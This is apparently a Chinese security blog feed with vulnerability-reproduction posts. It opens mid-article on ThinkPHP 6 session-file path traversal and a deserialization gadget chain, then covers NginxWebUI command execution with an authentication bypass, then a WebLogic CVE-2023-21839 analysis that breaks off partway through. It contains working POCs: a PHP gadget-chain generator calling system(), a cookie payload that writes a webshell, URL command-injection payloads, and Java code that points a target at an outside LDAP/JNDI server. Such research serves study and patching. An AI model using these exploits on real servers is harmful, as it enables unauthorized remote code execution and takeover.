&#123;        session(&#39;demo&#39;, $_GET[&#39;demo&#39;]);        return &#39;ThinkPHP V6.0.1&#39;;    &#125;    public function hello($name = &#39;ThinkPHP6&#39;)    &#123;        return &#39;hello,&#39; . $name;    &#125;&#125;</code></pre><p>修改 &#x2F;app&#x2F;middleware.php 文件如下,开启Session功能</p><pre><code class="php">&lt;?php// 全局中间件定义文件return [    // 全局请求缓存    // \think\middleware\CheckRequestCache::class,    // 多语言加载    // \think\middleware\LoadLangPack::class,    // Session初始化     \think\middleware\SessionInit::class];</code></pre><p>对比6.0.1和6.0.2，官方修改了<code>sessionid</code>的检查,添加了ctype_alnum 函数验证$id只能是字母和数字或字母数字的组合</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707093621722.png" alt="image-20230707093621722"></p><p>漏洞具体流程如下：</p><pre><code>?demo=AAAAA</code></pre><p>当程序初始化的时候，会对seess进行初始化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707105459607.png" alt="image-20230707105459607"></p><p>然后会调用<code>getName()</code>获取cookie中<code>PHPSESSID</code>的值，里面调用了setId（）</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707105829879.png" alt="image-20230707105829879"></p><p>如果不存在PHPSESSID,或者不满足条件，则重新生成一个32位的<code>PHPSESSID</code> , 如果满足条件则不管</p><p>调用栈如下：</p><pre><code class="php">Store.php:121, think\session\Store-&gt;setId()Store.php:61, think\session\Store-&gt;__construct()Session.php:31, think\Session-&gt;createDriver()Manager.php:65, think\Manager-&gt;getDriver()Manager.php:55, think\Manager-&gt;driver()Manager.php:174, think\Manager-&gt;__call()SessionInit.php:50, think\Manager-&gt;getName()SessionInit.php:50, think\middleware\SessionInit-&gt;handle()Middleware.php:142, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Middleware.php:142&#125;()Middleware.php:142, think\Middleware-&gt;think\&#123;closure:D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Middleware.php:137-148&#125;()Pipeline.php:84, think\Pipeline-&gt;think\&#123;closure:D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Pipeline.php:82-88&#125;()Pipeline.php:65, think\Pipeline-&gt;then()Http.php:204, think\Http-&gt;runWithRequest()Http.php:162, think\Http-&gt;run()index.php:20, &#123;main&#125;()</code></pre><p>返回<code>handle()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707110224668.png" alt="image-20230707110224668"></p><p>发现后面会再次取出PHPSESSID的值传给<code>setId</code>进行检查</p><p>后面的过程就是发送给客户端</p><p>当程序结束的时候，会执行中间件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707110744130.png" alt="image-20230707110744130"></p><p>里面会调用Sessioninit.php的end方法</p><pre><code class="php">public function end(Response $response)    &#123;        $this-&gt;session-&gt;save();    &#125;</code></pre><p>往下会执行,调用栈如下：</p><pre><code>Store.php:263, think\session\Store-&gt;save()Manager.php:174, think\Manager-&gt;__call()SessionInit.php:78, think\Manager-&gt;save()SessionInit.php:78, think\middleware\SessionInit-&gt;end()Middleware.php:165, think\Middleware-&gt;end()Http.php:279, think\Http-&gt;end()index.php:24, &#123;main&#125;()</code></pre><p>在这里存在一个日志写入的操作</p><pre><code class="php">public function save(): void    &#123;        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) &#123;            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        &#125; else &#123;            $this-&gt;handler-&gt;delete($sessionId);        &#125;        $this-&gt;init = false;    &#125;</code></pre><p>跟进<code>write()</code></p><pre><code class="php">public function write(string $sessID, string $sessData): bool    &#123;        $filename = $this-&gt;getFileName($sessID, true);        $data     = $sessData;        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        return $this-&gt;writeFile($filename, $data);    &#125;</code></pre><p>跟进<code>getFileName</code>  查看文件名生成规则，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111534094.png" alt="image-20230707111534094"></p><p>简而言之，就是</p><pre><code>日志路径/文件名文件名 = sess_  + PHPSSID的值</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111754581.png" alt="image-20230707111754581"></p><p>返回后，获取<code>$data</code>, 这个$data是序列化后的session值</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707111921264.png" alt="image-20230707111921264"></p><p>然后将这两个值传给<code>writeFile</code>方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707112027859.png" alt="image-20230707112027859"></p><p>跟进</p><pre><code class="php">protected function writeFile($path, $content): bool &#123;    return (bool) file_put_contents($path, $content, LOCK_EX);&#125;</code></pre><p>这里是调用了<code>file_put_contents</code> 进行文件写入</p><p>$path, $content都是可以控制的，  $content就是序列化后session的内容，$path就是sess_  + PHPSSID的值</p><p>$path这里可以通过目录穿越写入任意文件，但是需要满足<code>setId</code>的检查，长度必须要32位</p><pre><code class="php">public function setId($id = null): void    &#123;        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    &#125;</code></pre><p>所以构造POC如下：</p><pre><code>http://127.0.0.1/?demo=&lt;?php phpinfo();?&gt;Cookie: PHPSESSID=/../../../public/11111111111.php</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113517298.png" alt="image-20230707113517298"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113531457.png" alt="image-20230707113531457"><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707113610880.png" alt="image-20230707113610880"></p><h3 id="反序列-6-0-15"><a href="#反序列-6-0-15" class="headerlink" title="反序列 (6.0.15)"></a>反序列 (6.0.15)</h3><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;class Index extends BaseController&#123;    public function index()    &#123;        $u = unserialize($_GET[&#39;c&#39;]);        return &#39;ThinkPHP V6.x&#39;;    &#125;&#125;</code></pre><p>全局搜索__destruct(),发现TP6移除了TP5反序列化中的<code>think/process/pipes/Windows.php</code>入口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707141236993.png" alt="image-20230707141236993"></p><p>尝试寻找其他入口，查看<code>vendor/topthink/think-orm/src/Model.php</code>这个</p><pre><code class="php">public function __destruct()    &#123;        if ($this-&gt;lazySave) &#123;            $this-&gt;save();        &#125;    &#125;</code></pre><p>这个$this-&gt;lazySave可控，可以进入$this-&gt;save()</p><p>跟进<code>save()</code></p><pre><code class="php">public function save(array $data = [], string $sequence = null): bool    &#123;        // 数据对象赋值        $this-&gt;setAttrs($data);        if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) &#123;            return false;        &#125;        $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);        if (false === $result) &#123;            return false;        &#125;        // 写入回调        $this-&gt;trigger(&#39;AfterWrite&#39;);        // 重新记录原始数据        $this-&gt;origin   = $this-&gt;data;        $this-&gt;get      = [];        $this-&gt;lazySave = false;        return true;    &#125;</code></pre><p>这可以控制$this-&gt;exists使得函数调用<code>$this-&gt;updateData()</code></p><p>跟进<code>$this-&gt;updateData()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707144819630.png" alt="image-20230707144819630"></p><p>跟进<code>checkAllowFields()</code> </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165249733.png" alt="image-20230707165249733"></p><p>跟进db()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165321713.png" alt="image-20230707165321713"></p><p>这里存在一个字符串拼接可以触发任意类的<code>__toString</code></p><p>这里后面就可以使用<code>TP5.1.x</code>后半段的链子了</p><p>全局搜索<code>__toString</code> 找到<code>vendor/topthink/think-orm/src/model/concern/Conversion.php</code></p><pre><code class="php">public function __toString()    &#123;        return $this-&gt;toJson();    &#125;</code></pre><p>跟进<code>toJson()</code></p><pre><code class="php">public function toJson(int $options = JSON_UNESCAPED_UNICODE): string    &#123;        return json_encode($this-&gt;toArray(), $options);    &#125;</code></pre><p>跟进<code>toArray()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165504741.png" alt="image-20230707165504741"></p><p>这个方法里面调用 了<code>getAtter</code></p><p>跟进：</p><pre><code class="php">public function getAttr(string $name)    &#123;        try &#123;            $relation = false;            $value    = $this-&gt;getData($name);        &#125; catch (InvalidArgumentException $e) &#123;            $relation = $this-&gt;isRelationAttr($name);            $value    = null;        &#125;        return $this-&gt;getValue($name, $value, $relation);    &#125;</code></pre><p>最后调用了<code>getValue</code></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707165728185.png" alt="image-20230707165728185"></p><p>这个$closure是可控的，可以用来调用任意函数比如system()，其参数$value,是由上一层传来的参数控制，也可控</p><p>链子到这里结束</p><p>POC：</p><pre><code class="php">&lt;?phpnamespace think;abstract class Model&#123;    private $lazySave;    protected $suffix;    private $data;    private $withAttr;    function __construct($obj = &#39;&#39;)    &#123;        $this-&gt;lazySave = true;        $this-&gt;suffix =$obj;        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b));</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707170252876.png" alt="image-20230707170252876"></p><p>写在后面：</p><p>上面最后执行的方法在：</p><pre><code>vendor/topthink/think-orm/src/model/concern/Attribute.php</code></pre><p>在TP6后这里已经修复了：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707171052318.png" alt="image-20230707171052318"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化<code>__destruct</code>入口就那4-5个，常用的是这两个<code>think/process/pipes/Windows.php</code> 和<code>thinkphp/library/think/Process.php</code></p><p>上面提到的几条利用链，可以小记一下，但是<code>vendor/topthink/think-orm/src/model/concern/Attribute.php</code> 的<code>getValue</code>方法在TP6里面不能用了，需要寻找其他利用方法</p><p>Request.php中很多方法调用了<code>filterValue</code>,而该方法中就存在可利用的 <code>call_user_func</code>函数,反序列化结尾的利用可以考虑这里</p><p>php能代码执行的函数</p><pre><code class="php">//App.php//传参 ：call_user_func_array&amp;vars[0]=system&amp;vars[1][]=calcpublic static function invokeFunction($function, $vars = [])    &#123;        $reflect = new \ReflectionFunction($function);        $args    = self::bindParams($reflect, $vars);        // 记录执行信息        self::$debug &amp;&amp; Log::record(&#39;[ RUN ] &#39; . $reflect-&gt;__toString(), &#39;info&#39;);        return $reflect-&gt;invokeArgs($args);    &#125;</code></pre><pre><code class="php">//think/Request.php//传参： filter[]=system&amp;data=calcpublic function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)    &#123;        if (false === $name) &#123;            // 获取原始数据            return $data;        &#125;        $name = (string) $name;        if (&#39;&#39; != $name) &#123;            // 解析name            if (strpos($name, &#39;/&#39;)) &#123;                list($name, $type) = explode(&#39;/&#39;, $name);            &#125;            $data = $this-&gt;getData($data, $name);            if (is_null($data)) &#123;                return $default;            &#125;            if (is_object($data)) &#123;                return $data;            &#125;        &#125;        // 解析过滤器        $filter = $this-&gt;getFilter($filter, $default);        if (is_array($data)) &#123;            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);            if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) &#123;                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针                $this-&gt;arrayReset($data);            &#125;        &#125; else &#123;            $this-&gt;filterValue($data, $name, $filter);        &#125;        if (isset($type) &amp;&amp; $data !== $default) &#123;            // 强制类型转换            $this-&gt;typeCast($data, $type);        &#125;        return $data;    &#125;</code></pre><pre><code class="php">//think/view/driver/Php.php//传参： content=&lt;?php phpinfo();?&gt;public function display($content, $data = [])    &#123;        $this-&gt;content = $content;        extract($data, EXTR_OVERWRITE);        eval(&#39;?&gt;&#39; . $this-&gt;content);    &#125;</code></pre><p>写shell:</p><pre><code class="php">//think/template/driver/File.php//传参： cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;public function write($cacheFile, $content)    &#123;        // 检测模板目录        $dir = dirname($cacheFile);        if (!is_dir($dir)) &#123;            mkdir($dir, 0755, true);        &#125;        // 生成模板缓存文件        if (false === file_put_contents($cacheFile, $content)) &#123;            throw new Exception(&#39;cache write error:&#39; . $cacheFile, 11602);        &#125;    &#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NginxWebUi 任意命令执行漏洞</title>
      <link href="/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/07/01/NginxWebUi-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>nginxWebUI是一款图形化管理nginx配置的工具，能通过网页快速配置nginx的各种功能，包括HTTP和TCP协议转发、反向代理、负载均衡、静态HTML服务器以及SSL证书的自动申请、续签和配置，配置完成后可以一键生成nginx.conf文件，并控制nginx使用此文件进行启动和重载。<br> nginxWebUI后台提供执行nginx相关命令的接口，由于未对用户的输入进行过滤，导致可在后台执行任意命令。并且该系统权限校验存在问题，导致存在权限绕过，在前台可直接调用后台接口，最终可以达到无条件远程命令执行的效果。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>nginxWebUI &lt;&#x3D; 3.5.2  未授权命令执行漏洞（网上公开为3.5.0 但下载后发现作者已删除GITEE中3.5.0的相应代码，下载3.5.0版本jar包反编译后发现并没有对权限绕过进行修复）<br>nginxWebUI 全版本均存在命令执行漏洞(文章截止最新版3.6.0)</p><h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><h4 id="3-4-7-之前版本"><a href="#3-4-7-之前版本" class="headerlink" title="3.4.7 之前版本"></a>3.4.7 之前版本</h4><p>漏洞存在点：<code>com/cym/controller/adminPage/ConfController.java(3.4.7版本之前)</code></p><pre><code class="java">@Controller@Mapping(&quot;/adminPage/conf&quot;)public class ConfController extends BaseController &#123;    ...    @Mapping(value = &quot;runCmd&quot;)    public JsonResult runCmd(String cmd, String type) &#123;        if (StrUtil.isNotEmpty(type)) &#123;            settingService.set(type, cmd);        &#125;        try &#123;            String rs = &quot;&quot;;            if (SystemTool.isWindows()) &#123;                RuntimeUtil.exec(&quot;cmd /c start &quot; + cmd);            &#125; else &#123;                rs = RuntimeUtil.execForStr(&quot;/bin/sh&quot;, &quot;-c&quot;, cmd);            &#125;            cmd = &quot;&lt;span class=&#39;blue&#39;&gt;&quot; + cmd + &quot;&lt;/span&gt;&quot;;            if (StrUtil.isEmpty(rs) || rs.contains(&quot;已终止进程&quot;) //                    || rs.contains(&quot;signal process started&quot;) //                    || rs.toLowerCase().contains(&quot;terminated process&quot;) //                    || rs.toLowerCase().contains(&quot;starting&quot;) //                    || rs.toLowerCase().contains(&quot;stopping&quot;)) &#123;                return renderSuccess(cmd + &quot;&lt;br&gt;&quot; + m.get(&quot;confStr.runSuccess&quot;) + &quot;&lt;br&gt;&quot; + rs.replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));            &#125; else &#123;                return renderSuccess(cmd + &quot;&lt;br&gt;&quot; + m.get(&quot;confStr.runFail&quot;) + &quot;&lt;br&gt;&quot; + rs.replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));            &#125;        &#125; catch (Exception e) &#123;            logger.error(e.getMessage(), e);            return renderSuccess(m.get(&quot;confStr.runFail&quot;) + &quot;&lt;br&gt;&quot; + e.getMessage().replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));        &#125;    &#125;</code></pre><p><code>ConfController#runCmd()</code>方法中对传入 cmd 参数直接拼接到命令后执行命令</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code class="java">http://localhost:8080/AdminPage/conf/runCmd?cmd=calc</code></pre><h4 id="3-4-7-及之后版本"><a href="#3-4-7-及之后版本" class="headerlink" title="3.4.7  及之后版本"></a>3.4.7  及之后版本</h4><p>漏洞存在点：<code>com/cym/controller/adminPage/ConfController.java(3.4.7版本之后)</code></p><pre><code class="java">@Controller@Mapping(&quot;/adminPage/conf&quot;)public class ConfController extends BaseController &#123;    ...    @Mapping(value = &quot;runCmd&quot;)    ///adminPage/conf/runCmd?cmd=恶意命令    public JsonResult runCmd(String cmd, String type) &#123;        if (StrUtil.isNotEmpty(type)) &#123;            settingService.set(type, cmd);        &#125;        try &#123;            String rs = &quot;&quot;;            // 过滤特殊字符，防止命令拼接            cmd = cmd.replaceAll(&quot;;&quot;,&quot;\\\\;&quot;);             cmd = cmd.replaceAll(&quot;`&quot;,&quot;\\\\`&quot;);             cmd = cmd.replaceAll(&quot;\\|&quot;,&quot;\\\\|&quot;);             cmd = cmd.replaceAll(&quot;\\&#123;&quot;,&quot;\\\\&#123;&quot;);             cmd = cmd.replaceAll(&quot;\\&#125;&quot;,&quot;\\\\&#125;&quot;);            //仅执行nginx相关的命令，而不是其他的恶意命令            if(!cmd.contains(&quot;nginx&quot;))&#123;                cmd = &quot;nginx restart&quot;;            &#125;            if (SystemTool.isWindows()) &#123;                RuntimeUtil.exec(&quot;cmd /c start &quot; + cmd);            &#125; else &#123;                rs = RuntimeUtil.execForStr(&quot;/bin/sh&quot;, &quot;-c&quot;, cmd);            &#125;            cmd = &quot;&lt;span class=&#39;blue&#39;&gt;&quot; + cmd + &quot;&lt;/span&gt;&quot;;            if (StrUtil.isEmpty(rs) || rs.contains(&quot;已终止进程&quot;) //                    || rs.contains(&quot;signal process started&quot;) //                    || rs.toLowerCase().contains(&quot;terminated process&quot;) //                    || rs.toLowerCase().contains(&quot;starting&quot;) //                    || rs.toLowerCase().contains(&quot;stopping&quot;)) &#123;                return renderSuccess(cmd + &quot;&lt;br&gt;&quot; + m.get(&quot;confStr.runSuccess&quot;) + &quot;&lt;br&gt;&quot; + rs.replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));            &#125; else &#123;                return renderSuccess(cmd + &quot;&lt;br&gt;&quot; + m.get(&quot;confStr.runFail&quot;) + &quot;&lt;br&gt;&quot; + rs.replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));            &#125;        &#125; catch (Exception e) &#123;            logger.error(e.getMessage(), e);            return renderSuccess(m.get(&quot;confStr.runFail&quot;) + &quot;&lt;br&gt;&quot; + e.getMessage().replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;));        &#125;    &#125;    ...&#125;</code></pre><p><code>ConfController#runCmd()</code>方法中对传入 cmd 进行过滤后拼接到命令后执行命令，绕过过滤需满足以下要求：</p><ol><li>cmd 参数中存在 nginx</li><li><code>&quot;;&quot;  &quot;</code>“  “\|”  “\{“  “\}”&#96;被过滤，可使用 &amp; 绕过</li></ol><h5 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h5><pre><code class="java">http://localhost:8080/AdminPage/conf/runCmd?cmd=calc%26%26nginx</code></pre><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><h4 id="3-5-2-之前版本"><a href="#3-5-2-之前版本" class="headerlink" title="3.5.2 之前版本"></a>3.5.2 之前版本</h4><p> NginxWebUi 使用Solon开发框架，NginxWebUi 权限校验为<code>com/cym/config/AppFilter.java</code></p><pre><code class="java">@Componentpublic class AppFilter implements Filter &#123;    ...    @Override    public void doFilter(Context ctx, FilterChain chain) throws Throwable &#123;        // 全局过滤器        if (!ctx.path().contains(&quot;/lib/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/js/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/doc/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/img/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/css/&quot;)) &#123;            frontInterceptor(ctx);        &#125;        // 登录过滤器        if (ctx.path().contains(&quot;/adminPage/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/lib/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/doc/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/js/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/img/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/css/&quot;)) &#123;            if (!adminInterceptor(ctx)) &#123;                // 设置为已处理                ctx.setHandled(true);                return;            &#125;        &#125;        // api过滤器        if (ctx.path().contains(&quot;/api/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/lib/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/doc/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/js/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/img/&quot;) //                &amp;&amp; !ctx.path().contains(&quot;/css/&quot;)) &#123;            if (!apiInterceptor(ctx)) &#123;                // 设置为已处理                ctx.setHandled(true);                return;            &#125;        &#125;        chain.doFilter(ctx);    &#125;    ...&#125;</code></pre><p>根据以上源码可知若访问path 中包含 <code>/lib/  /adminPage/  /api/</code>且不包含<code>/lib/   /doc/  /js/   /img/  /css/</code>则进行权限校验，又因<a href="https://solon.noear.org/article/504">Solon 对大小写不敏感</a>，故可使用大小写绕过权限校验</p><h4 id="3-5-2-之后版本"><a href="#3-5-2-之后版本" class="headerlink" title="3.5.2 之后版本"></a>3.5.2 之后版本</h4><pre><code class="java">@Componentpublic class AppFilter implements Filter &#123;    Logger logger = LoggerFactory.getLogger(this.getClass());    @Inject    AdminService adminService;    @Inject    MessageUtils m;    @Inject    CreditService creditService;    @Inject(&quot;$&#123;solon.app.name&#125;&quot;)    String projectName;    @Inject    VersionConfig versionConfig;    @Inject    PropertiesUtils propertiesUtils;    @Inject    SettingService settingService;    @Override    public void doFilter(Context ctx, FilterChain chain) throws Throwable &#123;                String path = ctx.path().toLowerCase();                // 全局过滤器        if (!path.contains(&quot;/lib/&quot;) //                &amp;&amp; !path.toLowerCase().contains(&quot;/js/&quot;) //                &amp;&amp; !path.toLowerCase().contains(&quot;/doc/&quot;) //                &amp;&amp; !path.toLowerCase().contains(&quot;/img/&quot;) //                &amp;&amp; !path.toLowerCase().contains(&quot;/css/&quot;)) &#123;            frontInterceptor(ctx);        &#125;        // 登录过滤器        if (path.toLowerCase().contains(&quot;/adminPage/&quot;.toLowerCase()) //                &amp;&amp; !path.contains(&quot;/lib/&quot;) //                &amp;&amp; !path.contains(&quot;/doc/&quot;) //                &amp;&amp; !path.contains(&quot;/js/&quot;) //                &amp;&amp; !path.contains(&quot;/img/&quot;) //                &amp;&amp; !path.contains(&quot;/css/&quot;)) &#123;            if (!adminInterceptor(ctx)) &#123;                // 设置为已处理                ctx.setHandled(true);                return;            &#125;        &#125;        // api过滤器        if (path.toLowerCase().contains(&quot;/api/&quot;) //                &amp;&amp; !path.contains(&quot;/lib/&quot;) //                &amp;&amp; !path.contains(&quot;/doc/&quot;) //                &amp;&amp; !path.contains(&quot;/js/&quot;) //                &amp;&amp; !path.contains(&quot;/img/&quot;) //                &amp;&amp; !path.contains(&quot;/css/&quot;)) &#123;            if (!apiInterceptor(ctx)) &#123;                // 设置为已处理                ctx.setHandled(true);                return;            &#125;        &#125;        chain.doFilter(ctx);    &#125;&#125;</code></pre><p>3.5.0之后先对 path 进行处理再进行判断，权限绕过失败</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Weblogic漏洞(CVE-2023-21839和CVE-2023-21931)</title>
      <link href="/2023/06/28/%E5%85%B3%E4%BA%8EWeblogic%E6%BC%8F%E6%B4%9E-CVE-2023-21839%E5%92%8CCVE-2023-21931/"/>
      <url>/2023/06/28/%E5%85%B3%E4%BA%8EWeblogic%E6%BC%8F%E6%B4%9E-CVE-2023-21839%E5%92%8CCVE-2023-21931/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前没复现过Weblogic相关的漏洞，现在有空就想复现一下今年爆出的两个漏洞CVE-2023-21839和CVE-2023-21931，跟着大佬的文章学习一手</p><h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>T3协议参考<a href="https://c0ny1.gitbooks.io/javasec/content/jing-dian-an-li/t3xie-yi-yan-jiu.html">https://c0ny1.gitbooks.io/javasec/content/jing-dian-an-li/t3xie-yi-yan-jiu.html</a></p><p>查阅资料发现weblogic的反序列化漏洞大致分为两种，一种是基于T3协议的反序列化漏洞，一种是基于XML的反序列化漏洞。</p><p>关于这个T3协议，是Weblogic里面独有的一个协议，传输的数据是序列化后的数据，而服务器在接收到数据后会进行一个反序列化的操作，所以下面提到的两个漏洞都是属于<strong>后序列化漏洞</strong></p><h2 id="后序列化漏洞"><a href="#后序列化漏洞" class="headerlink" title="后序列化漏洞"></a>后序列化漏洞</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628161949561.png" alt="image-20230628161949561"></p><p>Weblogic反序列化漏洞挖掘思路是利⽤ readObject() 、 readResolve() 、 readExternal() 等反序列化⽅法对恶意序列化数据进⾏操作，以达到攻击⽬的。常规的漏洞思路重点关注Weblogic在反序列化过程中进⾏恶意攻击，⽽忽略了反序列化完成后的操作。后反序列化漏洞挖掘的思路重点关注Weblogic完成反序列化过程后，在达到某个时机或执⾏操作后触发的漏洞攻击。</p><h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>WebLogic存在远程代码执行漏洞，该漏洞允许未经身份验证的远程攻击者通过T3&#x2F;IIOP协议网络访问并破坏易受攻击的WebLogic服务器，成功利用此漏洞可能导致Oracle WebLogic服务器被接管或敏感信息泄露。漏洞原理其实是通过Weblogic t3&#x2F;iiop协议支持远程绑定对象bind到服务端，当远程对象继承自OpaqueReference时，lookup查看远程对象时，服务端调用远程对象getReferent方法，其中的remoteJNDIName参数可控，导致攻击者可利用rmi&#x2F;ldap远程协议进行远程命令执行。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code class="java">package org.example;import javax.naming.Context;import javax.naming.InitialContext;import java.lang.reflect.Field;import java.util.Hashtable;import weblogic.deployment.jms.ForeignOpaqueReference;public class App &#123;    public static void main(String[] args) throws Exception &#123;        String JNDI_FACTORY = &quot;weblogic.jndi.WLInitialContextFactory&quot;;        // 创建用来远程绑定对象的InitialContext        String url = &quot;t3://192.168.79.133:7001&quot;; // 目标机器        Hashtable env1 = new Hashtable();        env1.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);        env1.put(Context.PROVIDER_URL, url); // 目标        InitialContext c = new InitialContext(env1);        // ForeignOpaqueReference的jndiEnvironment属性        Hashtable env2 = new Hashtable();        env2.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        // ForeignOpaqueReference的jndiEnvironment和remoteJNDIName属性        ForeignOpaqueReference f = new ForeignOpaqueReference();        Field jndiEnvironment = ForeignOpaqueReference.class.getDeclaredField(&quot;jndiEnvironment&quot;);        jndiEnvironment.setAccessible(true);        jndiEnvironment.set(f, env2);        Field remoteJNDIName = ForeignOpaqueReference.class.getDeclaredField(&quot;remoteJNDIName&quot;);        remoteJNDIName.setAccessible(true);        String ldap = &quot;ldap://192.168.10.14:1389/Basic/Command/calc&quot;;        remoteJNDIName.set(f, ldap);        // 远程绑定ForeignOpaqueReference对象        c.rebind(&quot;sectest&quot;, f);        // lookup查询ForeignOpaqueReference对象        try &#123;            c.lookup(&quot;sectest&quot;);        &#125; catch (Exception e) &#123;        &#125;    &#125;&#125;</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>QpaqueReference在官方文档中提示了当实现此接口的对象从 WLContext 中检索（通过查找或 listBindings）时，由 getReferent() 返回对象。</p><p>因为ForeignOpaqueReference继承QpaqueReference，在远程查询该对象的时候，调用的将会是ForeignOpaqueReference.getReferent方法。</p><p>漏洞利用点在<code>weblogic.deployment.jms.ForeignOpaqueReference.getReferent</code>方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628163800653.png" alt="image-20230628163800653"></p><p>分析这个方法，发现在后续的进行lookup操作之前会检查 JNDI 环境是否已正确配置以访问远程资源，主要是对jndiEnvironment和remoteJNDIName的检测，如果在if中的任何一个条件为真，那么将调用对象的lookup方法，其中<code>remoteJNDIName</code>和<code>jndiEnvironment</code>是可以通过反射修改</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628170005065.png" 